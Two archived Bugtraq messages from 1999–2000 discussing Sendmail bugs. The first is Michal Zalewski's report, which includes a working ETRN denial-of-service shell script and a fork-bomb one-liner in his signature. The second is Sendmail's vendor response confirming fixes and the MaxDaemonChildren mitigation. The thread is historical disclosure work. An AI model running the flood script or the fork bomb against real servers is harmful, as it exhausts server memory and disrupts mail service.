=== Content from marc.info_3aa48ffd_20250125_230206.html ===

```
[[prev in list](?l=bugtraq&m=94597771220494&w=2)] [[next in list](?l=bugtraq&m=94597345015642&w=2)] [[prev in thread](?l=bugtraq&m=94581332005106&w=2)] [[next in thread](?l=procmail&m=100996601429508&w=2)]
List:       [bugtraq](?l=bugtraq&r=1&w=2)
Subject:    [Re: procmail / Sendmail - five bugs](?t=94563238500001&r=1&w=2)
From:       [Michal Zalewski <lcamtuf () IDS ! PL>](?a=90367780200003&r=1&w=2)
Date:       [1999-12-22 21:22:12](?l=bugtraq&r=1&w=2&b=199912)
[Download RAW [message](?l=bugtraq&m=94632241202626&q=mbox) or [body](?l=bugtraq&m=94632241202626&q=raw)]

On Tue, 21 Dec 1999, Rob Jones wrote:

> with or without these double-quotes the message is immediately dropped
> on redhat linux with the message

Oops! Yes, apparently this problem affects all versions of Sendmail, but
only with .cf file left from 8.8.x or previous releases. In fact, obsolete
.cf files are quite common if Sendmail has been updated by administrator -
'from hand' or from binary packages like .rpm - as people has not enough
time and good will to rebuild config files when replacing binary
(especially if there are some extensions/custom .cf settings).

So, another thing. There's nice remote Sendmail ETRN DoS. When ETRN
command is read by Sendmail (it shouldn't be allowed at all, IMHO), it
calls fork(). Parent process generates no output - only child-generated
output is sent, so parent won't be notified on send()/write() failure. If
we drop connection (after sending a lot of ETRNs), parent process will
stuck, doing repeately fork() ... sleep(5), till end of ETRNs read into
input buffer is reached. This allows us to spawn any amount of 'unusable'
sendmail childs, hanging for long period of time - and it can be done
using low network bandwitch and resources. Direct result - all server
memory consumed (causing Linux 2.0 kernels to crash with messages like 'no
memory for sendmail', 'no memory for klogd' etc). Unlike connect()
flooding, this attack is generating low traffic, only one connection at
time, and seems to be deadly harmful, unless something like:

# maximum number of children we allow at one time
O MaxDaemonChildren=15

is defined in sendmail.cf (as far I recall, this option is disabled by
default). The exploit follows (written for it's beautiful name):

-- gurghfrbl.sh --
#!/bin/sh

TARGET=localhost
COUNT=150
SLEEP=1

echo "gurghfrbl.sh - (c) lcamtuf '99"
echo -n "Tickle"

while :; do
  echo -n "."
  (
    NIC=0
    while [ "$NIC" -lt "$COUNT" ]; do
      echo "ETRN x"
    done
  ) | telnet $TARGET 25 &>/dev/null &
  sleep $SLEEP
  killall -9 telnet &>/dev/null
done
-- EOF --

_______________________________________________________________________
Michal Zalewski [lcamtuf@ids.pl] [link / marchew] [dione.ids.pl SYSADM]
[Marchew Industries] ! [<http://lcamtuf.na.export.pl>] bash$ :(){ :|:&};:
[voice phone: +48 22 813 25 86] <=-=> [cellular phone: +48 501 4000 69]
Iterowac jest rzecza ludzka, wykonywac rekursywnie - boska [P. Deutsch]

[[prev in list](?l=bugtraq&m=94597771220494&w=2)] [[next in list](?l=bugtraq&m=94597345015642&w=2)] [[prev in thread](?l=bugtraq&m=94581332005106&w=2)] [[next in thread](?l=procmail&m=100996601429508&w=2)]

```

[Configure](?q=configure) |
[About](?q=about) |
[News](?q=news) |
Add a list |
Sponsored by [KoreLogic](http://www.korelogic.com/)



=== Content from marc.info_f72ec667_20250125_230208.html ===

```
[[prev in list](?l=bugtraq&m=94780650512754&w=2)] [[next in list](?l=bugtraq&m=94791132225944&w=2)] [prev in thread] [next in thread]
List:       [bugtraq](?l=bugtraq&r=1&w=2)
Subject:    Re: procmail / Sendmail - five bugs
From:       [Gregory Neil Shapiro <sendmail+gshapiro () SENDMAIL ! ORG>](?a=91694393900002&r=1&w=2)
Date:       [2000-01-13 17:14:55](?l=bugtraq&r=1&w=2&b=200001)
[Download RAW [message](?l=bugtraq&m=94780566911948&q=mbox) or [body](?l=bugtraq&m=94780566911948&q=raw)]

-----BEGIN PGP SIGNED MESSAGE-----

lcamtuf> a) Sendmail (tested with 8.9.3 and previous) allows you to put
lcamtuf>    mail addressed to eg. '|/bin/sh' (or any file) into mail
lcamtuf>    queue. Fortunately, this queue file should contain also line
lcamtuf>    like 'Croot' to be processed properly, while we have no idea
lcamtuf>    how to put it there. But, anyway, seems to be dangerous -
lcamtuf>    Sendmail should reject such crap immediately:

lcamtuf>    /usr/sbin/sendmail -O 'DeliveryMode=d' '""|/bin/sh'

lcamtuf>    (without these double-quotes, it _will_ immediately drop your
lcamtuf>    message)

As you have noted, this appears only to be possible with an outdated .cf
file and an 8.9.3 binary.  However, even in this case, the address is not
accepted as there isn't a valid controlling user.  We have run through the
possible scenarios we could find and do not believe this to a threat.
Also, as people upgrade their binaries, they should upgrade their
configuration and this should not be an issue.

lcamtuf> b) Into queue files (qf*), Sendmail stores internal delivery
lcamtuf>    information, user-supplied headers (Hxxx) and server-added
lcamtuf>    headers (H?x?xxx). These headers are handled in several
lcamtuf>    different ways, depending on letter between '?' - but, in
lcamtuf>    general, are used to store default values for other headers
lcamtuf>    (like 'Date:' and 'Return-Path:'). But, headers like:

lcamtuf>    ?D?My-Own-Header: junk

lcamtuf>    are allowed in messages, and are put in unchanged form into
lcamtuf>    queue files, allowing possible conflicts or MTA confusion :P
lcamtuf>    For example, header '???This-Causes-Error: test' causes odd
lcamtuf>    error messages during message processing. What does it mean?
lcamtuf>    Probably nothing dangerous, but I haven't spend enough time
lcamtuf>    investigating this issue to be sure, maybe it's some way to
lcamtuf>    cause undesirable MTA behaviour.

Agreed, this is a bug.  The next beta version of 8.10.0 will not have this
problem.  Given this isn't a security problem, it will not be fixed for
8.9.3.

lcamtuf> c) Sendmail won't put X-Authentication-Warning header (eg. about
lcamtuf>    protocol violations, suspected options etc) into message if
lcamtuf>    there's one already present - no matter how stupid it is. Minor
lcamtuf>    bug.

This is also fixed in the next beta version of 8.10.0.

lcamtuf> So, another thing. There's nice remote Sendmail ETRN DoS. When
lcamtuf> ETRN command is read by Sendmail (it shouldn't be allowed at all,
lcamtuf> IMHO), it calls fork(). Parent process generates no output - only
lcamtuf> child-generated output is sent, so parent won't be notified on
lcamtuf> send()/write() failure. If we drop connection (after sending a lot
lcamtuf> of ETRNs), parent process will stuck, doing repeately fork()
lcamtuf> ... sleep(5), till end of ETRNs read into input buffer is
lcamtuf> reached. This allows us to spawn any amount of 'unusable' sendmail
lcamtuf> childs, hanging for long period of time - and it can be done using
lcamtuf> low network bandwitch and resources. Direct result - all server
lcamtuf> memory consumed (causing Linux 2.0 kernels to crash with messages
lcamtuf> like 'no memory for sendmail', 'no memory for klogd' etc). Unlike
lcamtuf> connect() flooding, this attack is generating low traffic, only
lcamtuf> one connection at time, and seems to be deadly harmful, unless
lcamtuf> something like:

lcamtuf> # maximum number of children we allow at one time
lcamtuf> O MaxDaemonChildren=15

Yes, MaxDaemonChildren will avoid this sort of denial of service attack.
However, the fact that sendmail buffers up commands after a remote side
drops its connection is a bug.  This bug will be fixed in the next 8.10.0
beta release.

Once again, thanks for bringing these bugs to our attention.

-----BEGIN PGP SIGNATURE-----
Version: PGPfreeware 5.0 for non-commercial use
Comment: Processed by Mailcrypt 3.5.5, an Emacs/PGP interface
Charset: noconv

iQCVAwUBOH4H/XxLZ22gDhVjAQH2jwP9HuMCOdSuROR1E5VFUIp+s+6TtGALNzh3
1tkO2L8LYav2FztbYQjI3kjdCAcocGZGW6k6vKoxU4b/3Y6Z/rEVs6QWTLick4Ei
uVk8ZIrq0Br4s4XEZg1V3x1U0Ex+1KPmlLmDqRyJYUio3wPV0Zie0CHbzAKavUlH
q5ze6Hq/m6k=
=955/
-----END PGP SIGNATURE-----

[[prev in list](?l=bugtraq&m=94780650512754&w=2)] [[next in list](?l=bugtraq&m=94791132225944&w=2)] [prev in thread] [next in thread]

```

[Configure](?q=configure) |
[About](?q=about) |
[News](?q=news) |
Add a list |
Sponsored by [KoreLogic](http://www.korelogic.com/)


